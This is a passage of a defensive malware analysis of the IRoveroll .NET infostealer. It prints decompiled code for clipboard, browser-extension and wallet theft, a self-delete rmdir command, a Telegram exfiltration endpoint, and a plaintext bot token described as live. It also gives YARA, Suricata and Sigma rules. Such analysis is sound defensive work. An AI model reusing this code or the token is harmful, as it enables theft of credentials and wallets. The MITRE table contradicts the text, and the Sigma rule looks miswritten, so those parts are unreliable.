The inclusion of `.mafile` is a specific signal -- it is the Steam Mobile Authenticator backup format used for bypassing 2FA when logging into Steam accounts from new devices. Combined with the Steam module in the same binary, this gives the operator everything needed to take over a victim's Steam account and drain its inventory.

`.kdbx` is even higher value -- a KeePass database that the operator can crack offline at leisure. Pairing this with the Grabber's seed-phrase hunter, the stealer is optimized for users who are security-adjacent but careless about where they store their secrets.

### 13. Clipboard Capture (The `SysInfo` Module)

The `SysInfo` module builds an `Information.txt` summary file with system details and embeds the current clipboard contents in it:

```csharp
// IRoveroll.Tar_gets.SysInfo.GetClipboardTextNoTimeout -- STA-threaded clipboard read
private static string GetClipboardTextNoTimeout()
{
    string result = string.Empty;
    try
    {
        Thread thread = new Thread((ThreadStart)delegate
        {
            try
            {
                if (Clipboard.ContainsText())
                    result = Clipboard.GetText();
            }
            catch { }
        });
        thread.SetApartmentState(ApartmentState.STA);  // WPF Clipboard requires STA
        thread.IsBackground = true;
        thread.Start();
        thread.Join();
    }
    catch { }
    return result ?? string.Empty;
}
```

`Clipboard.GetText()` from `System.Windows.Forms` requires an STA (Single-Threaded Apartment) thread, which is why the operation is wrapped in a fresh `Thread` with `SetApartmentState(STA)` and joined synchronously. The clipboard capture runs once at collection time -- this is not a keylogger that polls for changes; it is a single snapshot. If the victim had a password, wallet address, or 2FA code in their clipboard at the moment the stealer ran, it lands in the log.

The `Information.txt` schema assembled in parallel by `SysInfo` gives the operator an at-a-glance victim profile:

```text
[User Info]
User: <username>
Machine: <hostname>
Now: 2026-04-23 13:42:07
Hwid: <SHA-256 of MG|CPU|Cores|VOLS|MACS|MN>
Clipboard: <current clipboard text, if any>

[Network]
External IP: <from icanhazip.com>
Internal IP: <first non-loopback IPv4>
Default Gateway: <from NetworkInterface.GetIPProperties>

[System]
OS Product:  Windows 10 Pro
OS Build:    19045
OS Arch:     64-bit
CPU Name:    <ProcessorNameString>
Logical Cores: 8
RAM Total (MB):     <from GlobalMemoryStatusEx>
RAM Available (MB): <from GlobalMemoryStatusEx>

[Drives]
C: Fixed FS:NTFS Size:512GB Free:120GB
D: Fixed FS:NTFS Size:1024GB Free:890GB

[GPU]
NVIDIA GeForce RTX 3070
Intel(R) UHD Graphics 630

[Basic]
User Domain: <DOMAIN>
CLR Version: 4.0.30319.42000
```

The external IP is fetched from `http://icanhazip.com` (not `ip-api.com`, which is a common choice in other stealer families). No geolocation lookup is done in the binary -- the operator presumably runs a GeoIP resolution on their side using the collected IP.

### 14. User-Agent Harvesting (Session Hijacking Support)

The `UserAgentGenerator` module is a small but telling capability. It checks for the presence of seven browser installations and, for each one it finds, computes a User-Agent string matched to the exact installed browser version:

```csharp
// IRoveroll.Tar_gets.System.UserAgentGenerator -- session-hijacking UA builder
private readonly string[] paths = {
    @"C:\Program Files\Opera\launcher.exe",
    @"C:\Program Files\Apple\Safari\Safari.exe",
    @"C:\Program Files\Mozilla Firefox\firefox.exe",
    @"C:\Program Files\Google\Chrome\Application\chrome.exe",
    @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    @"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
    $@"C:\Users\{Environment.UserName}\AppData\Local\Yandex\YandexBrowser\Application\browser.exe"
};

// Chrome UA format
"Mozilla/5.0 (Windows NT 10.0; 64-bit) AppleWebKit/537.36 (KHTML, like Gecko) "
+ "Chrome/" + GetBrowserVersion(chromePath) + " Safari/537.36"
```

The output is a `UserAgents.txt` file in the ZIP, pairing each browser name with a version-matched User-Agent string. This is for **session replay attacks**: when the operator imports the victim's stolen cookies, matching the original User-Agent is critical for keeping session tokens alive, because many services (Google, Microsoft, Discord) invalidate sessions on a UA mismatch. Stealing the cookie without the UA is a waste. IRoveroll's author understood this.

### 15. Process List Dump

The `ProcessDump` module does not dump process memory (despite the name). It enumerates every running process via `NativeMethods.EnumProcesses`, captures Name, PID, full image Path, and working-set size, then writes a formatted table to `ProcessList.txt`. Useful to the operator for identifying installed EDR/AV, virtualization indicators, and running game clients at the time of infection.

### 16. Self-Deletion

The final act before exit is `AutoDel()`:

```csharp
private static void AutoDel()
{
    string dir = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
    Process.Start(new ProcessStartInfo {
        FileName = "cmd.exe",
        Arguments = "/C timeout 3 > nul & rmdir /s /q \"" + dir + "\"",
        CreateNoWindow = true,
        UseShellExecute = false
    });
}
```

A detached `cmd.exe` waits three seconds (for the parent process to exit) then recursively deletes the directory containing the binary. No persistence is established -- IRoveroll is a run-once, grab-and-go stealer.

---

## Crypto Wallet Coverage

The `CryptoDesktop` module hardcodes paths for twelve desktop wallet families:

| Wallet | Path |
|---|---|
| Zcash | `%APPDATA%\Zcash` |
| Armory | `%APPDATA%\Armory` |
| Bytecoin | `%APPDATA%\bytecoin` |
| Jaxx | `%APPDATA%\com.liberty.jaxx\IndexedDB\...` |
| Exodus | `%APPDATA%\Exodus\exodus.wallet` |
| Ethereum | `%APPDATA%\Ethereum\keystore` |
| Electrum | `%APPDATA%\Electrum\wallets` |
| AtomicWallet | `%APPDATA%\atomic\Local Storage\leveldb` |
| Guarda | `%APPDATA%\Guarda\Local Storage\leveldb` |
| Coinomi | `%LOCALAPPDATA%\Coinomi\Coinomi\wallets` |
| Tari | `%APPDATA%\com.tari.universe\...` |
| Bitcoin Core | `%APPDATA%\Bitcoin\wallets` |

Browser-based wallet extensions (MetaMask, Phantom, Trust Wallet, etc.) are covered separately by `CryptoChromium` and `CryptoGecko`, which enumerate extension storage directories for every installed Chromium and Gecko browser profile.

### Wildcard Extension Dump (Not ID-Targeted)

An unusual design choice: `CryptoChromium` does **not** hardcode a list of known wallet or MFA extension IDs. Most commodity stealers ship with a curated list of extension IDs like `nkbihfbeogaeaoehlefnkodbefgpgknn` (MetaMask) or `bhghoamapcdpbohphigoooaddinpkbai` (Authenticator). This stealer takes a different approach:

```csharp
// IRoveroll.Tar_gets.Crypto.CryptoChromium.GetChromeWallets
private void GetChromeWallets(ZipArchiveMemory zip, Counter counter,
                              string profilePath, string profilename, string browserName)
{
    ProcessKiller.Kill(browserName);
    string path = Path.Combine(profilePath, "Local Extension Settings");
    if (!Directory.Exists(path)) return;

    // Enumerate EVERY extension directory -- no allowlist, no filtering
    Dictionary<string, string> extensionDirs =
        Directory.EnumerateDirectories(path)
                 .ToDictionary(
                     dir => Path.GetFileName(dir).ToLowerInvariant(),
                     dir => dir);

    // Dump each directory's files wholesale into the ZIP
    Parallel.ForEach(extensionDirs, delegate(KeyValuePair<string, string> dirEl)
    {
        zip.AddDirectoryFiles(dirEl.Value,
            browserName + "_" + profilename + " " + dirEl.Key);
        counter.CryptoChromium.Add(dirEl.Value + " => " +
            browserName + "_" + profilename + " " + dirEl.Key);
    });
}
```

The extension ID becomes part of the output path (`Chrome_Default nkbihfbeogaeaoehlefnkodbefgpgknn`), and the operator sorts the haul offline. The trade-off is:

- **Pro**: evades YARA rules that key on specific extension IDs, catches every newly-released wallet or password manager without a rebuild.
- **Con**: exfil payloads are larger (grabs benign extensions too), and the operator must identify wallets/managers after the fact. This stealer has no idea which extension it stole until a human looks.

This same pattern covers browser-based wallets (MetaMask, Phantom), MFA apps (Authy extension, Google Authenticator), password managers (Bitwarden, 1Password browser extensions), and ad blockers -- all grabbed indirectly via the wholesale dump.

---

## Code Weaknesses

**Credentials embedded in the binary.** The Telegram bot token and chat ID are present in plaintext after the trivial base64 decoding. A defender who recovers the binary can immediately access the exfiltration channel, enumerate collected logs via the Telegram Bot API (`getUpdates`, `getFile`), or flood the channel with garbage data to disrupt operations.

**No C2 fallback.** All exfiltration flows through a single Telegram bot. If the bot is revoked (by reporting to Telegram) or the supergroup is deleted, the stealer has no secondary channel. Every collected log on an unreachable channel is lost.

**Synchronous HTTP on the main thread.** `PostAsync(...).GetAwaiter().GetResult()` blocks the main thread while uploading. On slow connections or large logs (browser cookies alone can exceed 45 MB), this creates a detectable hang window during which the stealer is doing nothing except talking to `api.telegram.org`.

**Anti-analysis checks are all userland.** Every `VirtualAssistant` check is pure managed code with no kernel validation. A single IL patch that rewrites `CheckOrExit` to return immediately bypasses the entire gauntlet. The filename check only looks for the substring `sandbox` in the process name, which is defeated by renaming the sample before launch.

**Hardcoded Chrome v20 keys.** The three per-flag keys baked into `ComputeMasterKeyV20` must match the Chrome release that produced the blob. When Chrome rotates these constants (roughly quarterly), v20 decryption silently fails on new installs. This is a maintenance burden the author must service continuously.

**Russian-language strings leak in error paths.** Cyrillic error messages in `ImpersonationHelper` and `CngDecryptor` (`Ошибка`, `Процесс winlogon.exe не найден`) survive compilation and sit in the string table even though they are only used in exception messages the stealer swallows. Any `strings | grep -P '[А-Я]'` flags the author's language.

**Distinctive mutex name.** `IMSEXYGIRL` is unique enough to serve as a high-fidelity host IOC. A single EDR rule on mutex creation with that exact name detects every IRoveroll execution.

**Duplicate entries in the process kill list.** `msedge_proxy.exe` appears twice in the Targets array (indices 33 and 36). Not a functional bug, but a code-hygiene signal that the author copy-pasted the list from somewhere rather than curating it.

**Obfuscated class name is pointless.** `S__T___e___aaa___ll_er` is a transparent rewrite of "Stealer" that survives compilation and is trivially matched by a regex like `S_+T_+e_+a+_+l+_+er`. Real string obfuscation would have required encrypted type renaming (ConfuserEx or equivalent), which this author chose not to deploy.

---

## Attribution Indicators

Five signals point toward a CIS-region (Russian-speaking) author:

1. Cyrillic error strings embedded in `ImpersonationHelper` (`Процесс winlogon.exe не найден`) and `CngDecryptor` (`Ошибка NCryptOpenStorageProvider`, `Ошибка NCryptDecrypt`, `Ошибка определения размера NCryptDecrypt`).
2. Company name in the PE version resource: **"Alsu Software"**. Alsu is a common Tatar and Russian female given name.
3. Dedicated handling of Yandex-specific credential stores (`Ya Passman Data`, `Ya Credit Cards`) that exist only in Yandex Browser and are absent from every other targeted Chromium variant.
4. The kill list includes `yandex.exe`, `sputnik.exe`, `nichrome.exe`, `qqbrowser.exe`, `uran.exe`, `baidubrowser.exe` -- browsers popular in Russia, CIS, and China but rare in Western markets.
5. The PDB path `D:\Projects\Client\IRoveroll` with the word "Client" suggests a for-hire or MaaS delivery model where this build was produced for a specific buyer.

---

## IOC Appendix

**Hashes**

| Type | Value |
|---|---|
| SHA-256 | `e7fcb6ab49296e69d1aa94091bb639a8ab3f69823ada857ab7fd5b3457a41867` |
| MD5 | `91b2420da18f82c5792497425425c03e` |
| SHA-1 | `7efdf5750fcad900c80e1dc58698f1c55c5766c0` |

**Network (defanged)**

| Type | Value | Context |
|---|---|---|
| Telegram Bot ID | `8393829487` | Bot identifier portion of the token |
| Telegram Bot Token | `8393829487:AAE3xZgel-Gfzccm4saPBJuNEoBqhXR8ZlI` | Full bot token (for takedown / sinkhole) |
| Telegram Chat ID | `-100380964339` | Destination supergroup |
| Telegram endpoint | `hxxps://api.telegram[.]org/bot<TOKEN>/sendDocument` | Exfil API call |
| External IP lookup | `hxxp://icanhazip[.]com` | Victim public IP fetch (no GeoIP done on-host) |
| IPv4 (metadata only) | `15[.]16[.]11[.]3` | Embedded in FileVersion, no runtime usage |

**Host**

| Type | Value |
|---|---|
| Mutex | `IMSEXYGIRL` |
| Drop path (when dropped) | `%TEMP%\<random>\svchost.zowner` |
| Self-delete command | `cmd.exe /C timeout 3 > nul & rmdir /s /q "<self dir>"` |
| PDB path | `D:\Projects\Client\IRoveroll\obj\Release\svchost.pdb` |
| Assembly MVID | `92ec30d7-0389-4552-932b-9e5fb7b975d6` |
| Namespace root | `IRoveroll.*` (all namespaces start with this prefix) |
| CNG key queried | `Google Chromekey1` (Microsoft Software Key Storage Provider) |

---

## MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|---|---|---|
| Masquerading (svchost.exe) | T1036 | Defense Evasion |
| Obfuscated Files or Information (MPRESS packer) | T1027.002 | Defense Evasion |
| Deobfuscate/Decode Files or Information (base64 config) | T1140 | Defense Evasion |
| Virtualization/Sandbox Evasion: System Checks | T1497.001 | Defense Evasion |
| Virtualization/Sandbox Evasion: User Activity | T1497.002 | Defense Evasion |
| File Deletion (self-delete) | T1070.004 | Defense Evasion |
| Impair Defenses: Disable or Modify Tools | T1562.001 | Defense Evasion |
| Windows Management Instrumentation (WMI probes) | T1047 | Execution |
| Access Token Manipulation: Token Impersonation (winlogon) | T1134.001 | Privilege Escalation |
| Abuse Elevation Control Mechanism (SeDebugPrivilege) | T1548 | Privilege Escalation |
| System Information Discovery | T1082 | Discovery |
| File and Directory Discovery | T1083 | Discovery |
| Query Registry | T1012 | Discovery |
| Process Discovery | T1057 | Discovery |
| System Network Configuration Discovery | T1016 | Discovery |
| System Location Discovery (GeoIP via ip-api) | T1614 | Discovery |
| Account Discovery | T1087 | Discovery |
| Credentials from Password Stores: Credentials from Web Browsers | T1555.003 | Credential Access |
| Steal Web Session Cookie | T1539 | Credential Access |
| Credentials from Password Stores: Windows Credential Manager | T1555.004 | Credential Access |
| Screen Capture | T1113 | Collection |
| Clipboard Data | T1115 | Collection |
| Data from Local System | T1005 | Collection |
| Archive Collected Data (ZIP) | T1560.002 | Collection |
| Application Layer Protocol: Web Protocols (Telegram API) | T1071.001 | C2 |
| Exfiltration Over Web Service | T1567 | Exfiltration |

---

## Detection

### YARA Rules

Two rules. Full file: [`stealers/iroveroll/iroveroll.yar`](https://github.com/taogoldi/YARA/blob/main/stealers/iroveroll/iroveroll.yar)

```text
import "pe"
import "dotnet"

rule IRoveroll_Stealer {
    meta:
        author      = "Tao Goldi"
        version     = 1
        description = "IRoveroll infostealer (Inqusitor Prod) - Telegram-exfiltrating .NET stealer masquerading as svchost.exe"
        sha256      = "e7fcb6ab49296e69d1aa94091bb639a8ab3f69823ada857ab7fd5b3457a41867"
        date        = "2026-04-23"
        tlp         = "WHITE"

    strings:
        $mutex          = "IMSEXYGIRL" ascii wide
        $ns_iroveroll   = "IRoveroll" ascii wide
        $tg_api         = "api.telegram.org" ascii wide
        $tg_send        = "sendDocument" ascii wide
        $tg_caption     = "LOG - " ascii wide
        $wmi_cache      = "Win32_CacheMemory" ascii wide
        $wmi_cim        = "CIM_Memory" ascii wide
        $autodel        = "rmdir /s /q" ascii wide
        $sandbox_ua     = "utilityaccount" ascii wide
        $sandbox_wdag   = "wdag" ascii wide
        $ver_company    = "Alsu Software" ascii wide
        $ver_product    = "Inqusitor Prod" ascii wide
        $ver_comment    = "Disable defender and antivirus softwares" ascii wide
        $discord_regex  = "dQw4w9WgXcQ:" ascii wide
        $ya_passman     = "Ya Passman Data" ascii wide
        $ya_cards       = "Ya Credit Cards" ascii wide
        $cng_key        = "Google Chromekey1" ascii wide
        $cyrillic_err   = "Процесс winlogon.exe не найден" ascii wide

    condition:
        uint16(0) == 0x5A4D
        and pe.is_pe
        and dotnet.is_dotnet
        and pe.characteristics & pe.EXECUTABLE_IMAGE
        and (
            $mutex
            or ($ns_iroveroll and $tg_api and $autodel)
            or ($ver_product and $ver_comment)
            or ($cyrillic_err and $cng_key)
            or (4 of ($tg_api, $tg_send, $tg_caption, $wmi_cache, $wmi_cim,
                      $sandbox_ua, $discord_regex, $ya_passman))
        )
}

rule IRoveroll_Config_Embedded {
    meta:
        author      = "Tao Goldi"
        version     = 1
        description = "IRoveroll Telegram bot config - base64-split chat ID markers"
        date        = "2026-04-23"

    strings:
        $mutex          = "IMSEXYGIRL" ascii wide
        $tg_token_kw    = "BOT_TOKEN" ascii wide
        $chatid_prefix  = "LQ==" ascii
        $config_dash    = "CHAT_ID" ascii wide

    condition:
        uint16(0) == 0x5A4D
        and $mutex
        and $tg_token_kw
        and $config_dash
        and $chatid_prefix
}
```

### Suricata

```text
alert tls $HOME_NET any -> $EXTERNAL_NET 443 (
    msg:"MALWARE IRoveroll Telegram exfil (sendDocument to api.telegram.org)";
    flow:established,to_server;
    tls.sni; content:"api.telegram.org"; nocase;
    http.uri; content:"/bot"; content:"/sendDocument"; distance:0;
    threshold: type both, track by_src, count 1, seconds 300;
    reference:md5,91b2420da18f82c5792497425425c03e;
    sid:2026048; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"MALWARE IRoveroll Telegram exfil -- sendDocument with 'LOG -' caption";
    flow:established,to_server;
    http.host; content:"api.telegram.org";
    http.method; content:"POST";
    http.uri; content:"/sendDocument";
    http.request_body; content:"[1/"; content:"] LOG - "; distance:0;
    sid:2026049; rev:1;
)
```

The first rule flags any TLS flow to `api.telegram.org` with `/bot.../sendDocument` in the URI once per source IP per 5 minutes -- useful in networks where Telegram is not legitimately used. The second rule inspects the multipart body for the distinctive `[n/total] LOG - ` caption and matches only IRoveroll-style uploads, not legitimate Telegram bot traffic.

### Sigma (Sysmon)

```text
title: IRoveroll IMSEXYGIRL Mutex Creation
status: experimental
logsource:
    product: windows
    service: sysmon
    definition: Sysmon with Event ID 17 (CreateMutant) enabled
detection:
    selection:
        EventID: 17
        PipeName|endswith: 'IMSEXYGIRL'
    condition: selection
level: critical
```

---

## Capability Boundary

After walking through every `ITar` module and every helper class, it is useful to document what this stealer explicitly does **not** do. Each entry below was verified against the decompiled source -- not inferred from the family name or an AV label:

| Capability | Present? | Evidence |
|---|---|---|
| **Keylogging** (hook-based) | No | No `SetWindowsHookEx`, no `WH_KEYBOARD_LL`, no `CallNextHookEx` in any class. |
| **Clipboard clipping** (write-back / address swap) | No | Clipboard is **read once** in `SysInfo.GetClipboardTextNoTimeout`. No `Clipboard.SetText` or `Clipboard.SetData` anywhere. Not a clipper. |
| **Webcam capture** | No | No `capCreateCaptureWindow`, no DirectShow, no `AForge.Video`. |
| **Screen capture** | No | Despite `ImageGrabber`'s misleading name, it grabs downloaded files, not screenshots. No `BitBlt`, no `CopyFromScreen`, no `Graphics.FromImage`. |
| **Password manager stealing** | No | No references to 1Password, Dashlane, NordPass, RoboForm, Bitwarden, KeePass, or LastPass paths. (`.kdbx` files are only picked up incidentally by `ImageGrabber` if downloaded via Telegram.) |
| **VPN config theft** | No | No NordVPN, OpenVPN, ProtonVPN, or PrivateVPN paths. |
| **Authenticator app theft** (desktop) | No | No WinAuth, no Authy Desktop, no Steam Authenticator desktop grabbing. (`.mafile` is an incidental `ImageGrabber` extension.) |
| **Windows Credential Manager / Vault** | No | No references to Windows Vault Schema GUIDs (`77BC582B-...`, `3E0E35BE-...`). No `VaultOpenVault` / `CredEnumerate` API calls. |
| **Credit card regex harvesting** | No | No Visa / Mastercard / Amex regex patterns. Credit cards are only stolen via the `Web Data` SQLite `credit_cards` table (browser-stored cards). |
| **Crypto wallet address regex** (for clipping) | No | No BTC / ETH / LTC / XMR address regex patterns. Wallets are only stolen from disk and browser extensions. |
| **Wireless network reconnaissance** | No | No `netsh wlan show profile`, no SSID / Wi-Fi password exfiltration. |
| **Windows Event Log clearing** | No | No `wevtutil`, no `Clear-EventLog`. This stealer makes no attempt to wipe its traces beyond the self-delete. |
| **Shadow copy deletion / ransomware** | No | No `vssadmin`, no `wmic shadowcopy`, no `bcdedit`. This is a stealer, not a ransomware component. |
| **UAC bypass** (fodhelper / CMSTP / eventvwr) | No | No COM-hijack registry paths like `\software\classes\ms-settings\shell\open\command` or `\Classes\mscfile\shell\open\command`. Relies purely on winlogon impersonation. |
| **Windows Defender tampering** | No | No `Set-MpPreference`, no `DisableAntiSpyware` registry writes. The `Comments` field in the PE resource says "Disable defender and antivirus softwares" but this is **aspirational metadata** -- the binary does not do it. |
| **Hardcoded extension IDs** (wallet / MFA / password manager) | No | Wildcard dump of `Local Extension Settings`, not an ID allowlist (see section above). |
| **Process hooking / injection** | No | No `VirtualAllocEx`, no `WriteProcessMemory`, no `CreateRemoteThread`, no reflective loader. |
| **NKN / blockchain C2** | No | Only Telegram. No NKN SDK, no ENS, no IPFS. |
| **Persistence** | No | Run-once, grab-and-go. `AutoDel` wipes the install dir after exfil. No registry Run key, no scheduled task, no startup folder. |

This boundary is a defender-friendly finding. Two community YARA rules matching on this sample -- [`SUSP_Stealer_Indicators_Jul23`](https://valhalla.nextron-systems.com/info/rule/SUSP_Stealer_Indicators_Jul23) and [`SUSP_PE_NET_Credential_Stealer_Indicators_Sep22_1`](https://valhalla.nextron-systems.com/info/rule/SUSP_PE_NET_Credential_Stealer_Indicators_Sep22_1) -- correctly classify it as a .NET credential stealer. A third match, `APT_MAL_SnakeKeylogger_Jun22_1`, is a false positive: this sample contains none of Snake Keylogger's distinctive markers (no SMTP exfil, no `SetWindowsHookEx` keylogger, no `SmtpClient` usage). The code review above rules that out definitively.

The stealer is a **data-grabber only**, optimized for a single exfil run. Defenders hunting for IRoveroll need to focus on credential-access telemetry and outbound Telegram API traffic; they can safely ignore detection categories for keylogging, clipping, screen capture, webcam, UAC bypass, and ransomware behavior.

---

## Conclusion

IRoveroll is a competently built, purpose-specific infostealer. The author invested real effort in a broad module catalog -- 52 targets covering browsers, messaging apps, game launchers, remote admin tools, FTP clients, and crypto wallets -- and included working implementations of every major browser encryption scheme including Chrome's v20 App-Bound Encryption in all three cipher-flag variants. The Telegram exfiltration channel is robust enough to handle 47 MB chunking, chat migrations, and transient network failures without losing data.

What the binary lacks is subtlety. The bot token is recoverable in under a minute. The mutex is unique enough to serve as a single-rule detection. The anti-analysis checks are all userland and fall to a single IL patch. The Russian error strings are readable in any hex editor. The class name `S__T___e___aaa___ll_er` does not even try to hide. This is a developer who understands credential theft mechanics but has not yet had to contend with serious detection engineering -- the kind of gap you see in early-stage MaaS operators before they learn to invest in anti-RE.

The Yandex-specific targeting, the Cyrillic error strings, and the "Alsu Software" company name together put the author in the CIS region. The PDB path `D:\Projects\Client\IRoveroll\obj\Release\svchost.pdb` -- with the word "Client" -- suggests a paid-build relationship rather than first-party operation.

For defenders: hunt for the `IMSEXYGIRL` mutex, the `IRoveroll` string in memory or on disk, `.NET` PE files with a PE timestamp beyond the current year combined with Telegram API strings, and outbound HTTPS to `api.telegram.org` from hosts with no legitimate Telegram use case. The Telegram bot token in this IOC section is live at the time of this writing -- report it to Telegram's [abuse reporting](https://telegram.org/faq#q-i-need-to-block-telegram-bot-for-sending-spam) channel to shut down the channel.

The full YARA ruleset is available at [`stealers/iroveroll/iroveroll.yar`](https://github.com/taogoldi/YARA/blob/main/stealers/iroveroll/iroveroll.yar), and the complete analysis bundle (YARA + structured JSON report + flowchart sources) is at [`iroveroll_apr_2026`](https://github.com/taogoldi/analysis_data/tree/main/iroveroll_apr_2026).

---

*Tools used: dnSpy / ILSpy (.NET decompilation), CFF Explorer (PE structure), Detect It Easy (packer identification), `unmpress` (MPRESS unpacking), pefile + pycryptodome (Python analysis helpers), Regex101 (validating the Discord token regexes). Family classification confirmed against [Malpedia](https://malpedia.caad.fkie.fraunhofer.de/) and VirusTotal community contributions.*